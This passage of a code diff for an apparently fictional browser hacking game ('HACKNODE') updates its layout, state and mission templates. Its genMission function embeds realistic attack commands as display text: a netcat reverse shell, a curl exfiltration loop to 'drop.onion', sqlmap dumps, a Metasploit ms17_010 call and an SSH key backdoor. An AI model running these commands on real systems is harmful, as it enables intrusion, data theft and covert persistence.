-.mtitle{font-size:12px;color:#00ff41;margin-bottom:3px;display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:flex-start;align-items:flex-start;gap:8px;}
-.mtag{font-size:9px;padding:1px 5px;border-radius:2px;background:#003a0f;color:#00ff41;-webkit-flex-shrink:0;flex-shrink:0;}
-.mtag.exfil{background:#001a3a;color:#00d4ff;}
-.mtag.crack{background:#2a0000;color:#ff2d2d;}
-.mtag.recon{background:#1a1a00;color:#ffb700;}
-.mdesc{font-size:10px;color:#4a7a4a;margin-bottom:5px;line-height:1.4;}
-.mmeta{display:-webkit-flex;display:flex;gap:10px;font-size:10px;-webkit-flex-wrap:wrap;flex-wrap:wrap;}
-.mmeta span{color:#4a7a4a;}
-.mmeta .v{color:#ffb700;}
-.qbadge{position:absolute;top:8px;right:36px;font-size:9px;color:#00d4ff;letter-spacing:1px;}
-.intel-badge{position:absolute;top:8px;right:36px;font-size:9px;color:#ffb700;letter-spacing:1px;}
-.pbar-row{display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:6px;font-size:9px;margin-top:4px;}
-.pbar-lbl{color:#4a7a4a;width:40px;}
-.pbar-trk{-webkit-flex:1;flex:1;height:3px;background:#0d180d;border:1px solid #1a3a1a;border-radius:1px;overflow:hidden;}
-.pbar-fill{height:100%;background:#003a0f;border-radius:1px;}
-
-/* UPGRADES */
-.usec{padding:9px 12px 3px;font-size:9px;color:#4a7a4a;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a3a1a;}
-.usec:first-child{border-top:none;}
-.uc{margin:5px 10px;padding:9px 12px;border:1px solid #1a3a1a;border-radius:4px;background:#050a05;cursor:pointer;display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:center;align-items:center;-webkit-transition:all .15s;transition:all .15s;}
-.uc:active{background:#0d180d;}
-.uc.maxed{opacity:.45;cursor:not-allowed;}
-.uc.broke{opacity:.55;}
-.uinfo{-webkit-flex:1;flex:1;}
-.uname{font-size:12px;color:#00ff41;margin-bottom:2px;}
-.udesc{font-size:10px;color:#4a7a4a;}
-.ucost{text-align:right;font-size:11px;}
-.ucost .cv{color:#ffb700;}
-
-/* SYSTEM */
-#repdisp{text-align:center;margin:12px;font-size:11px;color:#4a7a4a;}
-#repdisp .rv{color:#ffb700;font-size:14px;font-family:‘Orbitron’,monospace;}
-#pressec{margin:10px;padding:14px;border:1px solid #ff2d2d;border-radius:4px;background:rgba(255,45,45,.04);}
-#prestitle{font-family:‘Orbitron’,monospace;font-size:12px;color:#ff2d2d;margin-bottom:8px;letter-spacing:2px;}
-#presdesc{font-size:11px;color:#4a7a4a;margin-bottom:12px;line-height:1.6;}
-#presbtn{width:100%;padding:11px;background:transparent;border:1px solid #ff2d2d;border-radius:4px;color:#ff2d2d;font-family:‘Share Tech Mono’,monospace;font-size:11px;letter-spacing:3px;cursor:pointer;text-transform:uppercase;-webkit-appearance:none;appearance:none;}
-#presbtn:active{background:rgba(255,45,45,.15);}
-#presbtn:disabled{opacity:.3;cursor:not-allowed;}
-
-/* OFFLINE */
-#offmod{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.88);z-index:1000;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;}
-#offmod.on{display:-webkit-flex;display:flex;}
-#offbox{background:#080f08;border:1px solid #003a0f;border-radius:4px;padding:20px;max-width:320px;width:90%;}
-#offbox h2{font-family:‘Orbitron’,monospace;font-size:12px;color:#00ff41;letter-spacing:3px;margin-bottom:12px;}
-#offlog{font-size:11px;line-height:1.8;color:#4a7a4a;margin-bottom:16px;}
-#offlog .hi{color:#00ff41;}
-#offok{width:100%;padding:11px;background:#003a0f;border:1px solid #00ff41;border-radius:4px;color:#00ff41;font-family:‘Share Tech Mono’,monospace;font-size:11px;letter-spacing:2px;cursor:pointer;-webkit-appearance:none;appearance:none;}
-
-/* FX */
-.cfloat{position:fixed;pointer-events:none;font-family:‘Orbitron’,monospace;font-size:13px;color:#ffb700;text-shadow:0 0 8px #ffb700;z-index:500;animation:fup 1.2s ease-out forwards;}
-@keyframes fup{0%{opacity:1;-webkit-transform:translateY(0);transform:translateY(0);}100%{opacity:0;-webkit-transform:translateY(-40px);transform:translateY(-40px);}}
-@keyframes glitch{0%,100%{-webkit-transform:translate(0);transform:translate(0);filter:none;}20%{-webkit-transform:translate(-4px,2px);transform:translate(-4px,2px);filter:hue-rotate(90deg);}40%{-webkit-transform:translate(4px,-2px);transform:translate(4px,-2px);filter:hue-rotate(180deg) brightness(2);}60%{-webkit-transform:translate(-2px,4px);transform:translate(-2px,4px);filter:hue-rotate(270deg);}80%{-webkit-transform:translate(2px,-4px);transform:translate(2px,-4px);filter:brightness(3);}}
-.glitch{animation:glitch .4s ease forwards;}
+/* NEWS */
+.news-item{padding:8px 0;border-bottom:1px solid #1a3a1a;font-size:11px;color:#4a7a4a;line-height:1.6;}
+.news-item .nh{color:#ffb700;font-size:10px;letter-spacing:1px;margin-bottom:2px;}
+.news-item.alert .nh{color:#ff2d2d;}
 
 /* BOOT */
-#boot{position:fixed;top:0;left:0;right:0;bottom:0;background:#050a05;z-index:2000;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;-webkit-flex-direction:column;flex-direction:column;gap:16px;}
+#boot{position:fixed;inset:0;background:#050a05;z-index:2000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;}
 #bootlogo{font-family:‘Orbitron’,monospace;font-size:28px;font-weight:900;letter-spacing:8px;color:#00ff41;text-shadow:0 0 20px #00ff41,0 0 40px #00ff41;animation:glow 1s ease-in-out infinite;}
 @keyframes glow{50%{text-shadow:0 0 40px #00ff41,0 0 80px #00ff41;}}
 #bootstatus{font-size:11px;color:#4a7a4a;letter-spacing:2px;}
@@ -192,33 +220,17 @@ button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:trans
 </head>
 <body style="background:#050a05;color:#00ff41;">
 <div id="crt"></div><div id="vig"></div>
-
 <div id="boot"><div id="bootlogo">HACKNODE</div><div id="bootstatus">initializing...</div></div>
-
-<div id="offmod">
-  <div id="offbox">
-    <h2>// RECONNECTED</h2>
-    <div id="offlog"></div>
-    <button id="offok" onclick="closeOff()">[ CONTINUE ]</button>
-  </div>
-</div>
-
-<!-- INTERRUPT OVERLAY -->
-
-<div id="interrupt-overlay">
-  <div id="intbox">
-    <div id="int-title">⚠ ALERT</div>
-    <div id="int-body"></div>
-    <div id="int-timer"></div>
-    <div id="int-actions"></div>
-  </div>
-</div>
+<div id="offmod"><div id="offbox"><h2>// RECONNECTED</h2><div id="offlog"></div><button id="offok" onclick="closeOff()">[ CONTINUE ]</button></div></div>
+<div id="int-ov"><div id="intbox"><div id="int-title">⚠ ALERT</div><div id="int-body"></div><div id="int-timer"></div><div id="int-actions"></div></div></div>
 
 <div id="app">
   <div id="hdr">
     <div id="hdr-top">
       <div id="logo">HACKNODE</div>
-      <div id="alias">alias: <span id="alias-txt">ghost_r00t</span></div>
+      <div id="hdr-right">
+        <div id="alias">alias: <span id="alias-txt">ghost_r00t</span></div>
+      </div>
     </div>
     <div id="stats">
       <span>CR: $<span class="sv" id="s-cr">0</span></span>
@@ -226,15 +238,22 @@ button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:trans
       <span>CPU: <span class="sv" id="s-cpu">256MHz</span></span>
       <span>REP: <span class="sv" id="s-rep">×1.0</span></span>
     </div>
+    <div id="faction-bar"><span id="faction-cipher" style="display:none">▲ CIPHER OPERATIVE</span><span id="faction-ghost" style="display:none">▲ GHOSTNET AGENT</span></div>
     <div id="qind">QUEUE: <span id="qdisplay">—</span></div>
-    <div id="heatrow">
-      <span id="hlbl">TRACE</span>
-      <div id="htrk"><div id="hfill"></div></div>
-      <span id="hpct">0%</span>
-    </div>
+    <div id="market-ticker"></div>
+    <div id="heatrow"><span id="hlbl">TRACE</span><div id="htrk"><div id="hfill"></div></div><span id="hpct">0%</span></div>
   </div>
 
-  <div id="term"></div>
+  <div id="term-tabs">
+    <button class="ttab act" id="ttab-term" onclick="switchTab('term')">TERM</button>
+    <button class="ttab" id="ttab-msg" onclick="switchTab('msg')">MSG <span id="msg-badge" style="display:none">●</span></button>
+    <button class="ttab" id="ttab-news" onclick="switchTab('news')">NEWS</button>
+  </div>
+  <div style="flex:1;overflow:hidden;position:relative;">
+    <div id="term" class="tpane act" style="position:absolute;inset:0;"></div>
+    <div id="term-msg" class="tpane" style="position:absolute;inset:0;"></div>
+    <div id="term-news" class="tpane" style="position:absolute;inset:0;"></div>
+  </div>
 
   <div id="cmd-area">
     <div id="phlbl">// PHASE 1: EXECUTE COMMAND</div>
@@ -244,42 +263,41 @@ button{-webkit-appearance:none;appearance:none;-webkit-tap-highlight-color:trans
       <div id="progtrk"><div id="progfill"></div></div>
       <span id="progpct">0%</span>
     </div>
-    <!-- Pre-stage next command during processing -->
     <div id="prestage">
       <div id="prestage-lbl">// STAGING NEXT</div>
       <div id="prestage-cmd">
         <span id="prestage-prompt">root@hacknode:~$</span>&nbsp;
-        <span id="prestage-typed"></span>
-        <span id="prestage-rest"></span>
-        <span id="prestage-cursor"></span>
+        <span id="prestage-typed"></span><span id="prestage-rest"></span><span id="prestage-cursor"></span>
       </div>
     </div>
     <div id="cmddisplay">
       <span id="cmdprompt">root@hacknode:~$</span>&nbsp;
-      <span id="cmdtxt"></span>
-      <span id="cmdcursor"></span>
+      <span id="cmdtxt"></span><span id="cmdcursor"></span>
     </div>
     <button id="tapbtn" onclick="handleTap()">[ SELECT MISSION ]</button>
   </div>
 
   <div id="botnav">
-    <button class="nb act" id="nb-terminal" onclick="showPanel('none')">TERMINAL</button>
-    <button class="nb" id="nb-missions" onclick="showPanel('missions')">MISSIONS</button>
-    <button class="nb" id="nb-upgrades" onclick="showPanel('upgrades')">UPGRADES</button>
-    <button class="nb" id="nb-system" onclick="showPanel('system')">SYSTEM</button>
+    <button class="nb act" id="nb-terminal" onclick="showPanel('none')">TERM</button>
+    <button class="nb" id="nb-missions" onclick="showPanel('missions')">OPS</button>
+    <button class="nb" id="nb-map" onclick="showPanel('map')">MAP</button>
+    <button class="nb" id="nb-market" onclick="showPanel('market')">MKT</button>
+    <button class="nb" id="nb-upgrades" onclick="showPanel('upgrades')">HW</button>
+    <button class="nb" id="nb-system" onclick="showPanel('system')">SYS</button>
+    <button class="nb" id="nb-snd" onclick="toggleSound()" style="flex:0.7;font-size:9px;">SND</button>
   </div>
 </div>
 
 <div id="panel">
-  <div class="phdr"><span id="panel-title">MISSIONS</span><button class="pclose" onclick="showPanel('none')">✕</button></div>
+  <div class="phdr"><span id="panel-title">OPS</span><button class="pclose" onclick="showPanel('none')">✕</button></div>
   <div id="panel-content"></div>
 </div>
 
 <script>
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // STATE
-// ══════════════════════════════════════════════════════
-const SK='hacknode_v3';
+// ═══════════════════════════════════════════════
+const SK='hacknode_v6';
 const DS={
   credits:0,rep:1.0,prestigeCount:0,alias:'ghost_r00t',
   bandwidth:56,cpu:256,ram:512,latency:200,
@@ -287,20 +305,35 @@ const DS={
   missionProgress:0,missionRunning:false,
   missionQueue:[],maxQueueSize:1,
   typingTier:0,upgrades:{},
-  missionsCompleted:0,
-  knownTargets:{}, // id -> {ip, port, user} — target intel from recon
-  interruptFails:0, // resets each mission
+  missionsCompleted:0,totalCreditsEarned:0,
+  knownTargets:{},
+  faction:null, // 'cipher' | 'ghost' | null
+  factionOffered:false,
+  interruptFails:0,
+  soundOn:false,
+  tutorialDone:false,
+  tutorialStep:0,
+  lootInventory:[],     // [{type,qty,valueEach,listedAt,source,id}]
+  marketEarnings:0,     // lifetime market income
+  marketRate:1.0,       // 0.5-1.5, degrades with same-type flooding
+  networkNodes:{}, // nodeId -> {status:'unknown'|'scanned'|'owned'|'burned'|'rival_cipher'|'rival_ghost'|'rival_gov', ip, name}
+  currentSector:0,
+  sectorProgress:{0:{missions:0,owned:0},1:{missions:0,owned:0},2:{missions:0,owned:0},3:{missions:0,owned:0}},
+  unlockedSectors:[0],
+  deployedScripts:[], // [{scriptId, nodeId, active}]
+  activeTab:'term',   // terminal tab: 'term'|'msg'|'news'
+  msgUnread:false,
+  newsItems:[],       // procedural news feed
   lastSeen:Date.now(),
 };
 let G=JSON.parse(JSON.stringify(DS));
-let TS={command:'',typed:0}; // main typing state
-let PS={command:'',typed:0}; // pre-stage state
-let tapCD=false,procInt=null,autoInt=null,intTimerInt=null,cdownInt=null;
-let activeInterrupt=null;
+let TS={command:'',typed:0},PS={command:'',typed:0};
+let tapCD=false,procInt=null,autoInt=null,intTimerInt=null,cdownInt=null,ambientOsc=null,ambientGain=null;
+let activeInt=null,intState={active:false,tapsGiven:0,timerLeft:0,rewardHalved:false,processPaused:false};
 
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 // PROCEDURAL
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
 function rnd(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
 function randIP(){return `${rnd(10,220)}.${rnd(0,255)}.${rnd(0,255)}.${rnd(1,254)}`;}
 function randSN(){return `${rnd(10,192)}.${rnd(0,255)}.${rnd(0,255)}.0/24`;}
@@ -317,13 +350,54 @@ function buildEx(u,ip,kb){
   if(m<1024)return`rsync -avz --bwlimit=512 ${u}@${ip}:/var/db/ ./exfil/ --exclude="*.log"`;
   return`rsync -avz --bwlimit=256 ${u}@${ip}:/var/db/ ./stage/ && split -b 256m ./stage/dump.sql chunk_ && for f in chunk_*; do curl -s -F "file=@$f" http://drop.onion/up; done`;
 }
+
+// Named target corporations for narrative flavor
+// City district target name generator — sector maps to district
+// Sector 0=Downtown, 1=Financial, 2=Gov Quarter, 3=Undertown, 4=Intl Hub
+const DISTRICT_TARGETS={
+  0:[ // Downtown — open wifi, small biz, street devices
+    'CAFE_GUEST_WIFI','HOTEL_LOBBY_NET','SALON_POS_SYS','BODEGA_REGISTER',
+    'LAUNDROMAT_NAS','BAR_SECURITY_CAM','PARKING_METER_CTL','GYM_GUEST_NET',
+    'PIZZA_POS_UNIT','CORNER_STORE_NAS','STREET_CAM_04','HVAC_CONTROLLER',
+    'SMART_METER_7B','ISP_RELAY_NODE3','APARTMENT_ROUTER','PAWN_SHOP_SERVER',
+  ],
+  1:[ // Financial District — corps, banks, offices
+    'MERIDIAN BANK NODE','NEXUS CORP RELAY','ATLAS FINANCE DB','STRATUM LLC SERVER',
+    'VERTEX SYSTEMS HOST','NOVA TECH ARCHIVE','DELTA CORP PROXY','APEX GROUP MAIL',
+    'EXCHANGE TOWER NAS','BROKERAGE SUBNET','TRADING FLOOR NET','CORP LOBBY WIFI',
+    'OFFICE PARK RELAY','DATACENTER NODE B','HR SYSTEMS SERVER','PAYROLL ARCHIVE',
+  ],
+  2:[ // Government Quarter — municipal, police, city systems
+    'CITY HALL SERVER','POLICE DISPATCH NET','TRANSIT AUTHORITY DB','COURT RECORDS NODE',
+    'MUNICIPAL WIFI','WATER AUTHORITY SYS','PARKING ENFORCEMENT','CITY CAM NETWORK',
+    'PUBLIC RECORDS DB','MAYOR OFFICE RELAY','FIRE DEPT DISPATCH','DOT SIGNAL CTRL',
+    'COUNTY ARCHIVE','CITY IT SUBNET','ELECTIONS BOARD SYS','PERMITS OFFICE NAS',
+  ],
+  3:[ // Undertown — darknet relays, illegal markets, anonymous nodes
+    'DARKMARKET ESCROW','ANON RELAY NODE 7','VOID EXCHANGE HUB','SHADOW MIXER POOL',
+    'NULL CHAIN RELAY','GHOST LEDGER NODE','CIPHER MARKET SRV','ZERO_DAY BROKER',
+    'CONTRABAND ESCROW','CRYPTO TUMBLER 3','HITMAN FORUM RELAY','COUNTERFEIT STORE',
+    'RANSOMWARE C2 HOST','FORUM_DARK NODE 9','CARDER MARKET DB','EXPLOIT BROKER SRV',
+  ],
+  4:[ // International Hub — major corps, federal, global infrastructure
+    'AXIOM CORP NODE 7','FEDERAL RESERVE DB','INTERPOL SUBNET C','KRONOS ALLIANCE NET',
+    'GLOBAL GRID RELAY','INTL CLEARINGHOUSE','SWIFT NETWORK NODE','NATO RELAY ALPHA',
+    'WORLD BANK ARCHIVE','IMF DATA CENTER','PENTAGON SUBNET D','CERT AUTHORITY HUB',
+  ],
+};
+function randTarget(sector){
+  const s=sector!==undefined?sector:G.currentSector;
+  const pool=DISTRICT_TARGETS[Math.min(s,4)];
+  return pool[rnd(0,pool.length-1)];
+}
+// Keep randCorp as alias for compatibility
+function randCorp(sector){return randTarget(sector);}
+
 function genMission(t){
-  // Use known intel if available
   const intel=G.knownTargets[t.id];
-  const ip=intel?.ip||randIP(), sn=intel?.sn||randSN(),
-        port=intel?.port||randPort(), user=intel?.user||randUser(),
-        cve=randCVE(), hash=randHash(), fs=randFS();
-  const intelBonus=!!intel;
+  const ip=intel?.ip||randIP(),sn=intel?.sn||randSN(),port=intel?.port||randPort(),user=intel?.user||randUser();
+  const cve=randCVE(),hash=randHash(),fs=randFS(),corp=intel?.corp||randCorp(G.currentSector);
+  const ib=!!intel;
   const cmds={
     nmap_scan:`nmap -sV -p ${port} ${sn}`,
     john_crack:`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=sha256`,
@@ -331,357 +405,402 @@ function genMission(t){
     nc_listen:`nc -lvnp 4444 & python3 -c "import pty;pty.spawn('/bin/bash')" | nc ${ip} 4444`,
     scp_exfil:buildEx(user,ip,fs),
     aircrack:`aircrack-ng -w rockyou.txt -b ${ip.split('.').slice(0,3).join('.')}:XX:XX:XX:XX capture.cap`,
-    sqlmap:`sqlmap -u "http://${ip}/login.php" --dump --batch --level=3`,
-    metasploit:`msfconsole -x "use exploit/ms17_010; set RHOST ${ip}; run"`,
-    ssh_backdoor:`ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_backdoor && ssh-copy-id -i ~/.ssh/id_backdoor.pub ${user}@${ip}`,
-    worm_deploy:`python3 worm.py --target ${ip} --persist --hash ${hash}`,
+    sqlmap:`sqlmap -u "http://${ip}/login.php?id=1" --dump --batch --level=3`,
+    metasploit:`msfconsole -x "use exploit/ms17_010; set RHOST ${ip}; set LHOST 0.0.0.0; run"`,
+    ssh_backdoor:`ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_bd -N "" && ssh-copy-id -i ~/.ssh/id_bd.pub ${user}@${ip}`,
+    worm_deploy:`python3 worm.py --target ${ip} --persist --hash ${hash} --c2 drop.onion`,
   };
+  // Sector-appropriate target labels
+  const s=G.currentSector;
+  const targetLabel=s===0?`local host (${ip})`:`${corp} (${ip})`;
+  const targetShort=s===0?`local host`:`${corp}`;
   const descs={
-    nmap_scan:`Scan ${sn} for open port ${port}.`,
-    john_crack:`Offline hash crack. No trace risk.`,
-    hydra_ssh:`Brute force SSH on ${ip} as '${user}'.${intelBonus?' [INTEL BONUS]':''}`,
-    nc_listen:`Reverse shell via ${ip}.`,
-    scp_exfil:`Exfil ${fmtFS(fs)} from ${ip}.${intelBonus?' [INTEL: faster]':''}`,
-    aircrack:`Crack WiFi near ${ip.split('.').slice(0,2).join('.')}.x — very slow.`,
-    sqlmap:`SQL injection dump on ${ip}.`,
-    metasploit:`Deploy ${cve} against ${ip}.${intelBonus?' [INTEL: heat -30%]':''}`,
-    ssh_backdoor:`Install SSH key backdoor on ${ip}.`,
-    worm_deploy:`Deploy botnet node on ${ip}. [${hash}]`,
+    nmap_scan:s===0
+      ?`Wardrive block ${sn}. Discover nearby open devices.`
+      :`Scan ${sn}. Map ${corp}'s network surface.`,
+    john_crack:`Crack hash dump from ${targetShort}. No network trace.`,
+    hydra_ssh:`Brute force SSH on ${targetLabel} as '${user}'.${ib?' [INTEL ACTIVE]':''}`,
+    nc_listen:`Catch reverse shell from ${targetLabel}.`,
+    scp_exfil:`Pull ${fmtFS(fs)} from ${targetLabel}.${ib?' [INTEL: faster xfer]':''}`,
+    aircrack:`Crack WiFi near ${targetShort} — slow, untraceable.`,
+    sqlmap:`SQL inject login portal at ${targetLabel}.`,
+    metasploit:`Deploy ${cve} against ${targetLabel}.${ib?' [INTEL: heat -30%]':''}`,
+    ssh_backdoor:`Install persistent backdoor on ${targetLabel}.`,
+    worm_deploy:`Deploy C2 node inside ${targetLabel}.`,
   };
-  return{...t,command:cmds[t.id]||'',desc:descs[t.id]||'',_fs:fs,_ip:ip,_sn:sn,_port:port,_user:user,_intelBonus:intelBonus};
+  return{...t,command:cmds[t.id]||'',desc:descs[t.id]||'',_fs:fs,_ip:ip,_sn:sn,_port:port,_user:user,_corp:corp,_intelBonus:ib};
 }
 
-// ══════════════════════════════════════════════════════
-// MISSION TEMPLATES
-// ══════════════════════════════════════════════════════
+// ═══════════════════════════════════════════════
+// MISSION TEMPLATES  (balanced rewards + heat)
+// unlockAt:[missions, credits]
+// ═══════════════════════════════════════════════
 const MT=[
-  {id:'nmap_scan',   name:'NETWORK SCAN',      type:'recon', typeTag:'RECON',
-   hPC:.010,hOC:3,  reward:{base:70},  unlockAt:[0,0],
-   driver:'latency', pBase:7,
-   drops:'intel', // running this stores intel for follow-up missions
-   flavor:['Sending SYN packets...','Host is up (0.0021s latency)','Scanning ports...','Discovered open port {port}/tcp','OS fingerprint: Linux 4.x','Version detection complete.'],
+  {id:'nmap_scan',   name:'NETWORK SCAN',       type:'recon', typeTag:'RECON',
+   hPC:.08, hOC:6,  reward:{base:45},  unlockAt:[0,0],
+   driver:'latency', pBase:6,
+   drops:'intel',
+   flavorByS:{
+     0:['Wardriving downtown block {sn}...','New device detected: {ip}','Probe port {port}/tcp — open','Device type: embedded/IoT','Signal strength: -67dBm','Host mapped to territory.'],
+     1:['Probing CORP subnet...','Firewall detected — probing gaps','Host {ip} responding','Port {port}/tcp filtered','Banner: Apache/2.4','Corp host fingerprinted.'],
+     2:['GOV NETWORK scan — high risk','Packet loss: 42% (IDS active)','Partial fingerprint on {ip}','Port {port}/tcp — service unknown','Evading honeypot trap...','Partial intel acquired.'],
+     3:['Darknet probe via Tor...','Onion routing: 3 hops','Hidden service at {ip}','No banners — hardened target','Timing attack on port {port}','Node partially mapped.'],
+   },
+   flavor:['Scanning local subnet...','Host discovered: {ip}','Port {port}/tcp open','OS: Linux 4.x','Service: OpenSSH 8.2','New host mapped.'],
   },
-  {id:'john_crack',  name:'OFFLINE HASH CRACK', type:'crack', typeTag:'CRACK',
-   hPC:.000,hOC:0,  reward:{base:90},  unlockAt:[3,0],
-   driver:'cpu',    pBase:30,
-   flavor:['Loading hash file...','Trying dictionary attack...','Testing {n} passwords/s...','Hash: {hash}...','Cracked: 1 password hash','Writing to john.pot'],
+  {id:'john_crack',  name:'OFFLINE HASH CRACK',  type:'crack', typeTag:'CRACK',
+   hPC:.000,hOC:0,  reward:{base:60},  unlockAt:[3,0],
+   driver:'cpu',    pBase:28,
+   flavor:['Loading hash file...','Dictionary: rockyou.txt (14M entries)','Testing {n} hashes/s...','Candidate: {hash}...','1 password hash cracked','Written to john.pot'],
   },
-  {id:'hydra_ssh',   name:'BRUTE FORCE: SSH',   type:'crack', typeTag:'CRACK',
-   hPC:.022,hOC:10, reward:{base:320}, unlockAt:[8,500],
-   driver:'cpu',    pBase:22,
-   flavor:['Loading 14,344,391 passwords...','[22][ssh] login: {user} pass: password123 — FAIL','[22][ssh] login: {user} pass: qwerty — FAIL','[22][ssh] Trying batch {n}/512...','[22][ssh] login: {user} pass: {hash} — SUCCESS','Session established.'],
+  {id:'hydra_ssh',   name:'BRUTE FORCE: SSH',    type:'crack', typeTag:'CRACK',
+   hPC:.055,hOC:14, reward:{base:220}, unlockAt:[8,400],
+   driver:'cpu',    pBase:20,
+   flavor:['Loading 14,344,391 passwords...','[22][ssh] {user}:password123 — FAIL','[22][ssh] {user}:qwerty — FAIL','[22][ssh] Batch {n}/512...','[22][ssh] {user}:{hash} — SUCCESS','Session active.'],
   },
-  {id:'nc_listen',   name:'REVERSE SHELL',      type:'recon', typeTag:'RECON',
-   hPC:.018,hOC:8,  reward:{base:280}, unlockAt:[12,800],
-   driver:'latency', pBase:15,
-   flavor:['Binding port 4444...','Waiting for connection...','Connection received from {ip}','Spawning PTY...','Shell: root@target:/# ','Access secured.'],
+  {id:'nc_listen',   name:'REVERSE SHELL',       type:'recon', typeTag:'RECON',
+   hPC:.050,hOC:10,  reward:{base:190}, unlockAt:[12,700],
+   driver:'latency', pBase:13,
+   flavor:['Binding 0.0.0.0:4444...','Waiting for callback...','Connection from {ip}:43821','Spawning PTY shell...','root@target:/# ','Shell stable.'],
   },
-  {id:'scp_exfil',   name:'EXFIL: CORP DATABASE',type:'exfil', typeTag:'EXFIL',
-   hPC:.025,hOC:15, reward:{base:900}, unlockAt:[20,3000],
-   driver:'bandwidth',pBase:28,
-   flavor:['Authenticating...','Sending file manifest...','Transferring: /var/db/users.sql ({pct}%)','Transferring: /var/db/finance.sql ({pct}%)','Verifying checksums...','Transfer complete. {size} moved.'],
+  {id:'scp_exfil',   name:'EXFIL: DATABASE',     type:'exfil', typeTag:'EXFIL',
+   hPC:.065,hOC:20, reward:{base:620}, unlockAt:[20,2500],
+   driver:'bandwidth',pBase:25,
+   flavor:['Authenticating...','Manifest: 2,847 files','Xfer: /db/users.sql ({pct}%)','Xfer: /db/finance.sql ({pct}%)','Checksums verified...','Complete: {size} exfiltrated.'],
   },
-  {id:'aircrack',    name:'WIFI CRACK',          type:'crack', typeTag:'CRACK',
-   hPC:.005,hOC:2,  reward:{base:500}, unlockAt:[18,2000],
-   driver:'cpu',    pBase:55,
-   flavor:['Putting interface in monitor mode...','Capturing handshake packets...','Testing {n} passphrases...','WPA2 handshake captured...','Bruteforcing PSK...','Key found: [{hash}]'],
+  {id:'aircrack',    name:'WIFI CRACK',           type:'crack', typeTag:'CRACK',
+   hPC:.010,hOC:3,  reward:{base:340}, unlockAt:[18,1800],
+   driver:'cpu',    pBase:50,
+   flavor:['Monitor mode: wlan0mon','Capturing WPA2 handshakes...','Testing {n} passphrases/s...','PMKID attack on BSSID...','Wordlist exhausted: 60%...','Key: [{hash}]'],
   },
-  {id:'sqlmap',      name:'SQL INJECTION',       type:'exfil', typeTag:'EXFIL',
-   hPC:.030,hOC:14, reward:{base:750}, unlockAt:[25,5000],
-   driver:'bandwidth+latency',pBase:25,
-   flavor:['Testing injection points...','Parameter vulnerable: id={n}','Extracting database schema...','Dumping table: users ({pct}%)','Dumping table: sessions ({pct}%)','Dump complete.'],
+  {id:'sqlmap',      name:'SQL INJECTION',        type:'exfil', typeTag:'EXFIL',
+   hPC:.070,hOC:18, reward:{base:520}, unlockAt:[25,4500],
+   driver:'bandwidth+latency',pBase:22,
+   flavor:['Testing injection: id=1...','Parameter vulnerable: UNION-based','Extracting schema...','Dump: users ({pct}%)','Dump: transactions ({pct}%)','Complete.'],
   },
-  {id:'metasploit',  name:'EXPLOIT: ZERO-DAY',   type:'crack', typeTag:'CRACK',
-   hPC:.040,hOC:22, reward:{base:2400},unlockAt:[40,15000],
-   driver:'cpu+ram', pBase:35,
-   flavor:['Loading exploit module...','Checking target compatibility...','Sending payload buffer...','Trigger: heap overflow at 0x{hash}','Waiting for shell...','Shell opened. uid=0(root)'],
+  {id:'metasploit',  name:'EXPLOIT: ZERO-DAY',    type:'crack', typeTag:'CRACK',
+   hPC:.085,hOC:28, reward:{base:1800},unlockAt:[40,12000],
+   driver:'cpu+ram', pBase:32,
+   flavor:['Module: exploit/ms17_010','Target check: VULNERABLE','Payload: meterpreter/reverse_tcp','Buffer overflow at 0x{hash}...','Waiting for shell...','Meterpreter session opened. uid=0'],
   },
-  {id:'ssh_backdoor',name:'SSH BACKDOOR',         type:'exfil', typeTag:'EXFIL',
-   hPC:.020,hOC:6,  reward:{base:1100,passive:true},unlockAt:[50,25000],
-   driver:'bandwidth+latency',pBase:20,
-   flavor:['Generating 4096-bit RSA key...','Uploading public key...','Adding to authorized_keys...','Testing connection...','Configuring keep-alive...','Backdoor installed.'],
-  },
-  {id:'worm_deploy', name:'DEPLOY: BOTNET NODE',  type:'exfil', typeTag:'EXFIL',
-   hPC:.025,hOC:8,  reward:{base:600,passive:true},unlockAt:[65,50000],
+  {id:'ssh_backdoor',name:'SSH BACKDOOR',          type:'exfil', typeTag:'EXFIL',
+   hPC:.055,hOC:8,  reward:{base:820,passive:true},unlockAt:[50,22000],
    driver:'bandwidth+latency',pBase:18,
-   flavor:['Uploading worm payload...','Installing persistence daemon...','Configuring C2 callback...','Testing beacon... OK','Node registered in botnet.','Passive income stream active.'],
+   flavor:['RSA 4096-bit keygen...','Uploading public key...','Appending to authorized_keys...','Keep-alive configured...','Backdoor test: OK','Persistence confirmed.'],
+  },
+  {id:'worm_deploy', name:'DEPLOY: BOTNET NODE',   type:'exfil', typeTag:'EXFIL',
+   hPC:.060,hOC:10,  reward:{base:480,passive:true},unlockAt:[65,45000],
+   driver:'bandwidth+latency',pBase:16,
+   flavor:['Staging payload (stage2.bin)...','Uploading worm...','Installing cron persistence...','Beacon test to drop.onion...','Node ID assigned: {hash}','C2 registered. Passive mode.'],
   },
 ];
+
+// Faction-specific bonus missions (unlocked after alignment choice)
+const FACTION_MT={
+  cipher:[
+    {id:'cipher_darkweb', name:'DARKWEB MARKET HACK', type:'crack', typeTag:'CRACK',
+     hPC:.060,hOC:20, reward:{base:1200},unlockAt:[25,5000],
+     driver:'cpu+ram',pBase:28,
+     flavor:['Accessing .onion market...','Exploiting PHP upload vuln...','Shell on escrow server...','Grabbing BTC wallet keys...','Wiping logs...','Funds: redirected.'],
+    },
+  ],
+  ghost:[
